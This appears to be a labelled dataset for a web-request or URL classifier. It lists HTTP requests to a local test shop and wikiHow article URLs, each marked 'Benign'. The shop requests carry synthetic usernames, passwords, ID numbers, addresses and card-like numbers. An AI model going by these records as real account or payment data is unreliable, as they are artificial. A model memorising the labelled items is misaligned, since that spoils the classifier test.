http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=monaghan&pwd=h2mitero&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2181&b1=pasar+por+caja,Benign
http://www.wikihow.com/make-the-tastiest-hot-chocolate&t=1396545607134&n=1650108&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hughie&password=cascab.ullo&nombre=vladimir&apellidos=launes+de+vigo&email=strassberg%40universla.yu&dni=11634902f&direccion=pl.+nuestro+padre+jesus+de+la+sagrada+cena%2c+110+&ciudad=anchuras&cp=37516&provincia=cuenca&ntc=6977232709193068&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=urbanic&password=3em5d79s&nombre=divico&apellidos=di+giuseppe&email=azar%40archivodeimagenes.eu&dni=20514170x&direccion=fornalutx+176+&ciudad=agolada&cp=26606&provincia=huelva&ntc=3631273433865643&b1=registrar,Benign
http://www.wikihow.com/act-when-somebody-pays-you-a-compliment&t=1396631692961&n=5487202&k=mainentity,Benign
http://www.wikihow.com/add-an-fm-transmitter-or-external-speaker-to-ge-lights-and-sounds-of-christmas&t=1396534373966&n=1157233&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=cluett&pwd=sotavente7rse&remember=off&b1=entrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kyu-sung&password=acepilladura&nombre=georgina&apellidos=gunker+bail%e9n&email=barash%40newcosl.cl&dni=07566986d&direccion=calle+san+blas%2c+98%2c+&ciudad=bell-lloc+d%27urgell&cp=50548&provincia=segovia&ntc=1431036964031676&b1=registrar,Benign
http://www.wikihow.com/get-the-achievement-%22hands-off-the-merchandise%22&t=1396649362347&n=6000507&k=mainentity,Benign
http://www.wikihow.com/give-yourself-an-amazing-hand-scrub&t=1396593321200&n=3880412&k=mainentity,Benign
http://www.wikihow.com/make-and-use-an-offering-bowl&t=1396570017210&n=2930161&k=mainentity,Benign
http://www.wikihow.com/look-for-horse-books&t=1396527683416&n=842685&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=conoly1&password=se4uestrador&nombre=manases&apellidos=pancorbo+strick&email=marlen-kirchberg%40lamolahotel.tl&dni=61170907s&direccion=travesia+travesia+3+isaac+peral+60%2c+6%3ff&ciudad=fuentemolinos&cp=48170&provincia=salamanca&ntc=8145247630144584&b1=registrar,Benign
http://www.wikihow.com/choose-between-iphone-and-android-smartphones&t=1396533513991&n=1116749&k=mainentity,Benign
http://www.wikihow.com/make-glazed-donuts&t=1396595026245&n=3966343&k=mainentity,Benign
http://www.wikihow.com/make-akki-roti&t=1396526953184&n=810528&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=griggs3&pwd=v5riam35nto&remember=off&b1=entrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=39&cantidad=72&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/care-for-a-boston-terrier&t=1396516661342&n=265788&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8046&b1=pasar+por+caja,Benign
http://www.wikihow.com/freeze-unbaked-biscuit-or-cookie-dough&t=1396517604466&n=327391&k=mainentity,Benign
http://www.wikihow.com/do-a-power-slide-turbo-boost-on-mario-kart-ds&t=1396649148194&n=5991931&k=mainentity,Benign
http://www.wikihow.com/use-a-map-based-gps-navigation&t=1396533408657&n=1111853&k=mainentity,Benign
http://www.wikihow.com/choose-a-water-bed&t=1396563262703&n=2601988&k=mainentity,Benign
http://www.wikihow.com/create-a-encrypted-dmg-file-(mac)&t=1396533233893&n=1104492&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=gammage&pwd=422r0ce5a8e67&remember=off&b1=entrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=merrile&pwd=ventri.loquia&remember=off&b1=entrar,Benign
http://www.wikihow.com/decorate-a-bedroom-without-paint&t=1396562047498&n=2524916&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=amar&pwd=45ech41a&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9008&b1=pasar+por+caja,Benign
http://www.wikihow.com/make-a-planter-from-concrete-pipe&t=1396561910951&n=2517040&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam%f3n+ib%e9rico&precio=85&cantidad=32&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/incorporate-activities-into-your-child%27s-life&t=1396609477903&n=4682970&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=abel&password=entresijo&nombre=divico&apellidos=tutusaus&email=martlew_vera-ellen%40acch-portugal.as&dni=66809608j&direccion=c%2f+santa+teresa+de+avila%2c+5%2c+3%3fc&ciudad=arnuero&cp=02439&provincia=cantabria&ntc=1820193328818228&b1=registrar,Benign
http://www.wikihow.com/be-a-good-babysitter-on-animal-jam&t=1396648212483&n=5956263&k=mainentity,Benign
http://www.wikihow.com/be-the-best-warrior-cat-ever&t=1396633394195&n=5527005&k=mainentity,Benign
http://www.wikihow.com/get-restricted-audible-books-in-australia&t=1396527765978&n=846205&k=mainentity,Benign
http://www.wikihow.com/create-an-automatic-plant-watering-device-from-a-hot-sauce-bottle&t=1396561545407&n=2496248&k=mainentity,Benign
http://www.wikihow.com/make-a-phone-ring-using-your-home-stereo&t=1396534281593&n=1152361&k=mainentity,Benign
http://www.wikihow.com/do-coupon-matchups&t=1396613077574&n=4804387&k=mainentity,Benign
http://www.wikihow.com/make-cute-bobby-pins-in-shape-of-windmill&t=1396564033075&n=2648386&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=vandewat2&password=casuch%2ba&nombre=dhevi&apellidos=corvo&email=lemons.horrocks%4011horas.um&dni=96676664m&direccion=calle+benidorm+73+13-h&ciudad=matarrubia&cp=08231&provincia=murcia&ntc=6508542119029834&b1=registrar,Benign
http://www.wikihow.com/pack-a-care-package-for-kids-at-camp&t=1396631184063&n=5475600&k=mainentity,Benign
http://www.wikihow.com/wear-islamic-hijab&t=1396518005087&n=353670&k=mainentity,Benign
http://www.wikihow.com/make-a-layered-tropical-smoothie-(all-natural)&t=1396545630158&n=1651636&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=leon&pwd=mad252c5%f3n&remember=off&b1=entrar,Benign
http://www.wikihow.com/make-spicy-raspberry-ratafia&t=1396517303355&n=304993&k=mainentity,Benign
http://www.wikihow.com/make-honey-bbq-ribs&t=1396547208255&n=1750856&k=mainentity,Benign
http://www.wikihow.com/stand-strong-and-be-able-to-say-no&t=1396516172838&n=240706&k=mainentity,Benign
http://www.wikihow.com/delete-archived-messages-on-facebook&t=1396629745097&n=5432105&k=mainentity,Benign
http://www.wikihow.com/be-a-heavy-gunner-in-call-of-duty:-world-at-war&t=1396649308274&n=5998379&k=mainentity,Benign
http://www.wikihow.com/make-a-hand-vise&t=1396563020809&n=2587796&k=mainentity,Benign
http://www.wikihow.com/bless-a-home-with-a-smudge-stick&t=1396569616277&n=2912669&k=mainentity,Benign
http://www.wikihow.com/live-your-life-like-a-sofia-coppola-film&t=1396528095504&n=862129&k=mainentity,Benign
http://www.wikihow.com/be-tokio-hotel-on-meez&t=1396648058606&n=5949655&k=mainentity,Benign
http://www.wikihow.com/get-rid-of-sweet-page.com-virus-from-web-browser&t=1396526711085&n=797278&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=568&b1=confirmar,Benign
http://www.wikihow.com/make-frozen-pickle-juice&t=1396545654795&n=1653380&k=mainentity,Benign
http://www.wikihow.com/create-a-glowing-garden&t=1396561929550&n=2518196&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precio=100&cantidad=25&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/train-a-puppy-to-run-an-agility-course-in-nintendogs&t=1396516850539&n=274260&k=mainentity,Benign
http://www.wikihow.com/prepare-an-employee-datasheet-with-escalc&t=1396612487077&n=4787263&k=mainentity,Benign
http://www.wikihow.com/get-rid-of-poison-oak-reactions&t=1396594444212&n=3936390&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=campagna&pwd=r0-%ed21&remember=on&b1=entrar,Benign
http://www.wikihow.com/delete-your-friendster-profile&t=1396532163615&n=1054050&k=mainentity,Benign
http://www.wikihow.com/migrate-from-interspire-to-magento-using-cart2cart&t=1396533862627&n=1132849&k=mainentity,Benign
http://www.wikihow.com/play-mobsters&t=1396629931586&n=5439397&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=buggie&password=entre8e58r&nombre=natana&apellidos=canales+cubr%eda&email=dalmatoff_carrillo%40hipereuskadi.om&dni=80985651y&direccion=c%2f+velers%2c+57+4%3fc&ciudad=rafelcofer&cp=43781&provincia=badajoz&ntc=2275621874601888&b1=registrar,Benign
http://www.wikihow.com/make-lemon-ricotta-muffins&t=1396595211905&n=3981935&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4303&b1=pasar+por+caja,Benign
http://www.wikihow.com/train-for-the-1500m-run&t=1396610222197&n=4704022&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rico&password=1er%24r0tido&nombre=madai&apellidos=clavel+idro&email=reed-erbd%40enibiza.com.tm&dni=92162042f&direccion=c%2f+domingo+pisaca+burgada%2c+28%2c+13%3fe&ciudad=alcanadre&cp=02513&provincia=cuenca&ntc=0312320266873888&b1=registrar,Benign
http://www.wikihow.com/complete-grand-theft-auto-iv:-mission-pest-control&t=1396649472097&n=6004946&k=mainentity,Benign
http://www.wikihow.com/make-a-layered-cheese-and-meat-taco&t=1396613992795&n=4840768&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=part&password=fonograf%eda&nombre=ant%f3n&apellidos=pasquel&email=lommel.christenson3%40prestigecars.eg&dni=73333530p&direccion=almeria+s%2fn+&ciudad=zafra+de+z%e1ncara&cp=07669&provincia=burgos&ntc=2238109467991588&b1=registrar,Benign
http://www.wikihow.com/be-superstitious&t=1396569717768&n=2916833&k=mainentity,Benign
http://www.wikihow.com/understand-more-about-the-voluntary-hp-notebook-battery-recall&t=1396532697236&n=1075728&k=mainentity,Benign
http://www.wikihow.com/get-out-of-a-romantic-rut&t=1396571059683&n=2973353&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=crystie&password=esp5u19o&nombre=georgania&apellidos=cabezudo+calders&email=haydn%40veocime.ua&dni=08603168h&direccion=calle+ramon+hernandez+197%2c+9%3fh&ciudad=atalaya&cp=46149&provincia=le%f3n&ntc=5184864321979129&b1=registrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=prinz&password=93l9rta&nombre=hilari%f3n&apellidos=valle+salip&email=sonneveld.mardirosian%40bloger%f3tico.vu&dni=69564192w&direccion=ponent%2c+130+&ciudad=vimbod%ed+i+poblet&cp=37140&provincia=barcelona&ntc=5377607815069357&b1=registrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=292&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dialout&password=3ra41&nombre=doncel&apellidos=de+hernandez+ayestar%e1n&email=anka.mayll%40botilleria.com.ci&dni=86990486r&direccion=foix+147%2c+&ciudad=teruel&cp=40599&provincia=barcelona&ntc=1560160893774975&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=barnett57&password=9ila&nombre=alda&apellidos=balbuena+tamargo&email=bogert%40convenci%f3nes.dm&dni=48819681l&direccion=pla%e7a+galvany%2c+57%2c+2-f&ciudad=sant+fost+de+campsentelles&cp=22586&provincia=las+palmas&ntc=0141446477429225&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=bobbi&password=s5bde9ir93&nombre=laura&apellidos=torrelli+casares&email=menz%40soybueno.cc&dni=15967873p&direccion=c%2f+granados+114+&ciudad=ataquines&cp=07300&provincia=granada&ntc=7541405746725221&b1=registrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam%f3n+ib%e9rico&precio=85&cantidad=41&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bernie&pwd=9ep5en5r18&remember=off&b1=entrar,Benign
http://www.wikihow.com/apply-cool-makeup-for-special-occasions&t=1396593803240&n=3907652&k=mainentity,Benign
http://www.wikihow.com/put-hearts-on-myspace&t=1396629821534&n=5435241&k=mainentity,Benign
http://antivirus.baidu.com/static/js/jquery_1.11.1.js,Benign
http://www.wikihow.com/choose-the-right-tool-for-the-job&t=1396563002398&n=2586892&k=mainentity,Benign
http://www.wikihow.com/create-a-permalink-to-a-yelp-tip-you-created&t=1396629583382&n=5424669&k=mainentity,Benign
http://www.wikihow.com/get-a-guy-to-hold-you&t=1396570658985&n=2956221&k=mainentity,Benign
http://www.wikihow.com/present-in-an-hp-virtual-room&t=1396533066968&n=1096336&k=mainentity,Benign
http://www.wikihow.com/have-the-best-indoor-picnic&t=1396547116326&n=1741848&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bergstro3&password=decl.arable&nombre=irma&apellidos=gamarra&email=hodiak%40muevemiweb.kp&dni=69532078l&direccion=asturias%2c+54%2c+&ciudad=sestrica&cp=48180&provincia=toledo&ntc=2027173235946877&b1=registrar,Benign
http://www.wikihow.com/develop-your-spiritual-cv&t=1396570312398&n=2942341&k=mainentity,Benign
http://www.wikihow.com/get-over-your-friend-ditching-you-for-a-new-boyfriend&t=1396571759971&n=3000181&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=valida&pwd=do9trinador&remember=on&b1=entrar,Benign
http://www.wikihow.com/perform-better-in-auditions&t=1396632747347&n=5508352&k=mainentity,Benign
http://www.wikihow.com/make-a-floating-city-on-minecraft-demo&t=1396648478582&n=5967799&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=maracle&password=jansenismo&nombre=tamar&apellidos=larroder+vela&email=mobley_bonn%40delujos.cv&dni=47550183y&direccion=calle+cerro+de+san+miguel%2c+134%2c+11g&ciudad=bacares&cp=20570&provincia=c%e1ceres&ntc=5497122222863682&b1=registrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam%f3n+ib%e9rico&precio=100&cantidad=58&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/track-time-with-chrometa-time-tracker&t=1396612749795&n=4793032&k=mainentity,Benign
http://www.wikihow.com/use-hannah-montana-name-in-lights-on-bebo&t=1396629696812&n=5430125&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=norvig&password=bolivariana&nombre=nieves&apellidos=freites+figueres&email=fosse7%40yiutuve.gq&dni=38736387v&direccion=rio+1%2c+&ciudad=laviana&cp=45450&provincia=valencia&ntc=7806141465394091&b1=registrar,Benign
http://www.wikihow.com/become-a-feng-shui-consultant&t=1396562252035&n=2536620&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam%f3n+ib%e9rico&precio=85&cantidad=52&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=tyron&pwd=beod5&remember=on&b1=entrar,Benign
http://www.wikihow.com/import-furniture&t=1396563393398&n=2608308&k=mainentity,Benign
http://www.wikihow.com/prepare-your-face-freckles-free&t=1396594170915&n=3926505&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=grande5&password=ag9ad1cha1&nombre=ileana&apellidos=camarena+iennaco&email=mera%40espaciopintor.web&dni=39362058l&direccion=rivas%2c+100%2c+&ciudad=mingorr%eda&cp=29462&provincia=granada&ntc=6432562767172976&b1=registrar,Benign
"http://www.wikihow.com/complete-the-second-mission-in-%22grand-theft-auto-san-andreas%22-(xbox)-%22big-smoke,-sweet-and-kendle%22&t=1396649440782&n=6003447&k=mainentity",Benign
http://www.wikihow.com/bash-script-for-mass-changes&t=1396533095733&n=1097828&k=mainentity,Benign
http://www.wikihow.com/create-a-dialog-animation-with-goanimate-in-youtube-create&t=1396630121031&n=5447093&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=yann&password=bifl9ro&nombre=yael&apellidos=montalv%e1n+agujetas&email=defilippo%40biosoftware.um&dni=37437225x&direccion=josep+maria+sert%2c+183+10%3fa&ciudad=chantada&cp=31239&provincia=valladolid&ntc=1723550006148792&b1=registrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kadamani&pwd=3ra5s3un81no&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=100&cantidad=34&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/record-digital-interviews&t=1396534257433&n=1151233&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=saad&password=9o6i7i9a947&nombre=solita&apellidos=soto+jovellar&email=etaix2%40hangartalleres.gi&dni=92775507q&direccion=calle+gumersindo+robayna+galvan%2c+133%2c+6%3fc&ciudad=barco+de+%c1vila%2c+el&cp=34260&provincia=toledo&ntc=2516408741722266&b1=registrar,Benign
http://www.wikihow.com/be-friends-with-a-jew-if-you-are-a-muslim&t=1396569705614&n=2916217&k=mainentity,Benign
http://www.wikihow.com/emulate-artemis-fowl-(for-girls)&t=1396633588747&n=5532109&k=mainentity,Benign
http://www.wikihow.com/save-money-on-books-on-the-internet&t=1396527771745&n=846437&k=mainentity,Benign
http://www.wikihow.com/care-for-amaryllis-flowers&t=1396561516808&n=2494524&k=mainentity,Benign
http://www.wikihow.com/edit-your-bump-contact-card&t=1396613174080&n=4808635&k=mainentity,Benign
http://www.wikihow.com/avoid-getting-wet-on-the-log-flume&t=1396527887702&n=852149&k=mainentity,Benign
http://www.wikihow.com/choose-the-best-wrinkle-cream&t=1396593939695&n=3915028&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mavra8&pwd=p%3flatuja&remember=on&b1=entrar,Benign
http://www.wikihow.com/be-great-at-role-playing&t=1396528214376&n=868193&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4523&b1=pasar+por+caja,Benign
http://www.wikihow.com/befriend-a-band&t=1396571468288&n=2989325&k=mainentity,Benign
http://www.wikihow.com/find-a-good-dog-walker&t=1396527109171&n=822760&k=mainentity,Benign
http://www.wikihow.com/protect-your-lips-from-sun-damage&t=1396594053766&n=3920544&k=mainentity,Benign
http://www.wikihow.com/use-the-additive-method-to-create-a-chair-in-sketchup&t=1396630430636&n=5457315&k=mainentity,Benign
http://www.wikihow.com/politely-decline-reading-the-book-%22twilight%22&t=1396633328900&n=5524321&k=mainentity,Benign
http://www.wikihow.com/get-driving-distance-data-for-multiple-point-on-google-maps-or-other-map-services&t=1396533396109&n=1111285&k=mainentity,Benign
"http://www.wikihow.com/share-your-pictures,-videos-and-audio-on-twitter-with-tvider&t=1396629939102&n=5439681&k=mainentity",Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=greaney&password=a_eronave&nombre=gea&apellidos=munt+pi&email=chizkiyahu%40lingote.com.com&dni=00498360l&direccion=c%2f+coronado+131%2c+5%3fg&ciudad=alforja&cp=27956&provincia=cuenca&ntc=2226955584670828&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=joline&password=pa6omer9-a&nombre=ageo&apellidos=aza+aulet&email=tetzlaff%40surcosur.ph&dni=50009204m&direccion=camino+casabermeja%2c+s%2fn+3b&ciudad=pizarra&cp=24442&provincia=albacete&ntc=6797549361526674&b1=registrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ayles&pwd=rose&remember=off&b1=entrar,Benign
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1,Benign
http://www.wikihow.com/tour-in-israel&t=1396570382219&n=2945113&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=nady&pwd=berro4ue%f1a&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9766&b1=confirmar,Benign
http://www.wikihow.com/be-a-friend-to-someone-without-them-desperately-clinging-to-you&t=1396571626302&n=2995505&k=mainentity,Benign
http://www.wikihow.com/help-a-friend-who-is-rebounding&t=1396571416017&n=2987433&k=mainentity,Benign
http://www.wikihow.com/prepare-adobo-chicken-or-pork&t=1396613881875&n=4831720&k=mainentity,Benign
http://www.wikihow.com/cosplay-as-arrietty&t=1396528229771&n=868865&k=mainentity,Benign
http://www.wikihow.com/know-that-god-loves-you&t=1396570007684&n=2929773&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=elonore&pwd=r10bo9b7&remember=off&b1=entrar,Benign
http://www.wikihow.com/choose-a-commercial-roofer&t=1396562615422&n=2559880&k=mainentity,Benign
http://www.wikihow.com/make-a-belgian-chocolate-layer-cake&t=1396517063004&n=289073&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=balvinde&password=d%210visa&nombre=spencer&apellidos=manzo+wiese&email=stobbeleer%4018horas.md&dni=67911701s&direccion=carrer+domenech+i+montaner%2c+8+&ciudad=porto&cp=25310&provincia=navarra&ntc=8811866823125640&b1=registrar,Benign
http://www.wikihow.com/be-lgbt-at-a-unitarian-universalist-church&t=1396571872672&n=3004885&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=frank&password=kil%f3metro&nombre=canciana&apellidos=ca%f1ella+valtierra&email=shatner.prussel%40tristanyvioletina.mo&dni=44636251j&direccion=c%2f+santa+brigida%2c+130+11-e&ciudad=puerto+castilla&cp=40194&provincia=salamanca&ntc=1652631168753822&b1=registrar,Benign
http://www.wikihow.com/take-care-of-oily-skin-with-homemade-products&t=1396594089153&n=3922008&k=mainentity,Benign
http://www.wikihow.com/create-an-autumn-inspired-eye-makeup-look&t=1396593670189&n=3901092&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7990&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=chancey&pwd=des2ervig6mi3nto&remember=on&b1=entrar,Benign
http://www.wikihow.com/play-dvd-movies-on-an-ipad&t=1396534229911&n=1149841&k=mainentity,Benign
http://www.wikihow.com/convert-outlook-to-lotus-notes-with-pst-to-nsf-converter&t=1396533614723&n=1121181&k=mainentity,Benign
http://www.wikihow.com/buy-books-for-kids&t=1396527752274&n=845729&k=mainentity,Benign
http://www.wikihow.com/be-a-sniper-your-team-can-depend-on-in-call-of-duty-4:-modern-warfare&t=1396649205250&n=5993419&k=mainentity,Benign
http://www.wikihow.com/get-admin-on-a-roblox-game&t=1396647884409&n=5941199&k=mainentity,Benign
http://www.wikihow.com/have-a-jewish-baby-naming-ceremony-for-your-daughter&t=1396570353820&n=2943961&k=mainentity,Benign
http://www.wikihow.com/make-lampshades-with-butterflies&t=1396526447423&n=783839&k=mainentity,Benign
http://www.wikihow.com/ask-a-girl-out-in-grade-7-to-8&t=1396612124807&n=4776390&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=100&cantidad=25&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/get-out-of-foundation-on-halo-2&t=1396649506279&n=6006354&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=salehi&password=cintura&nombre=ticiano&apellidos=puch+kinderman&email=trott%40campodegolf.com.ci&dni=12773567b&direccion=travessera+pizarro%2c+164%2c+&ciudad=cumbres+mayores&cp=05146&provincia=zamora&ntc=5592242504094790&b1=registrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3301&b1=pasar+por+caja,Benign
http://www.wikihow.com/get-a-leading-role-in-a-play&t=1396632735181&n=5507932&k=mainentity,Benign
http://www.wikihow.com/keep-your-house-from-overcooling&t=1396562808977&n=2573856&k=mainentity,Benign
http://www.wikihow.com/deal-with-jerks-on-movie-star-planet&t=1396648363947&n=5962383&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=39&cantidad=16&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6167&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=39&cantidad=27&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=stokes&password=ordenadora&nombre=adon%edas&apellidos=amargant&email=ruymen%40twinjet.pro&dni=37124001t&direccion=calle+de+av.+america+a+c%2fo%27donnell+paz%2c+164+5%3fg&ciudad=tomares&cp=10830&provincia=zamora&ntc=2604331184906708&b1=registrar,Benign
http://www.wikihow.com/appreciate-courtney-love&t=1396527539708&n=837129&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=39&cantidad=38&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/find-information-on-ipos&t=1396613351651&n=4814895&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=raphaela&password=sal-tarel&nombre=mar%eda+begonia&apellidos=victory+peris&email=bowie0%40showeb-handling.bi&dni=52699935n&direccion=barranco+de+tocodoman+26+&ciudad=totan%e9s&cp=18690&provincia=badajoz&ntc=7419127880104005&b1=registrar,Benign
http://www.wikihow.com/have-an-internationally-themed-tea-tasting-party&t=1396546797664&n=1726192&k=mainentity,Benign
http://www.wikihow.com/make-a-boy-want-you-desperately&t=1396611862127&n=4765954&k=mainentity,Benign
http://www.wikihow.com/be-weird-to-people-on-any-website-that-allows-chat&t=1396532466875&n=1066410&k=mainentity,Benign
http://www.wikihow.com/hack-a-library/school-computer&t=1396531873300&n=1040606&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam%f3n+ib%e9rico&precio=85&cantidad=14&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/use-command-line-for-veritas-media-commands&t=1396611130865&n=4745433&k=mainentity,Benign
http://www.wikihow.com/make-a-fire-using-dried-leaves-and-branches&t=1396631130491&n=5473100&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=wendall&password=316r9b1rat4&nombre=am%edlcar&apellidos=casellas&email=preiss%4023horas.ag&dni=03696380g&direccion=c%2f+la+barqueta%2c+56+&ciudad=alentisque&cp=41510&provincia=segovia&ntc=6087445564133176&b1=registrar,Benign
http://www.wikihow.com/be-good-in-school-in-animal-jam&t=1396648227423&n=5956863&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=85&cantidad=40&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8749&b1=pasar+por+caja,Benign
http://www.wikihow.com/breed-a-great-foal-on-howrse.com&t=1396648031764&n=5948519&k=mainentity,Benign
http://www.wikihow.com/do-roundings-in-revit-formulas&t=1396533571687&n=1118993&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=walley&pwd=limpieza&remember=on&b1=entrar,Benign
http://www.wikihow.com/have-a-midnight-party-(for-camp-counselors)&t=1396631173851&n=5475248&k=mainentity,Benign
http://www.wikihow.com/host-a-candy-themed-birthday-party&t=1396546804977&n=1726648&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hardcast3&password=re-construcci%f3n&nombre=sulko&apellidos=cantabella&email=montenegro_riaume%40elsentidodelavida.vg&dni=24562422d&direccion=campo+de+san+domingos+de+bonaval%2c+192%2c+&ciudad=torralba+de+los+frailes&cp=15600&provincia=lugo&ntc=8529530384111874&b1=registrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam%f3n+ib%e9rico&precio=39&cantidad=9&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/make-a-non-alcoholic-citrus-cocktail&t=1396545807350&n=1662880&k=mainentity,Benign
http://www.wikihow.com/look-pretty-on-stardoll&t=1396647814177&n=5938135&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=zampino&password=inc5m2encia&nombre=felicia&apellidos=pellico+guidino&email=hunold%40internacionalexpofloralzaragoza2014.cat&dni=41502558r&direccion=c%2f+joanot+martorell+104%2c+4h&ciudad=riba-roja+de+t%faria&cp=24239&provincia=zaragoza&ntc=0812707749779479&b1=registrar,Benign
http://www.wikihow.com/act-like-tallstar&t=1396528117379&n=863017&k=mainentity,Benign
http://www.wikihow.com/do-makeup-like-selena-gomez-at-the-2010-vmas&t=1396593854068&n=3910848&k=mainentity,Benign
http://www.wikihow.com/avoid-electrical-problems-during-the-holiday-season&t=1396562540485&n=2555616&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9859&b1=confirmar,Benign
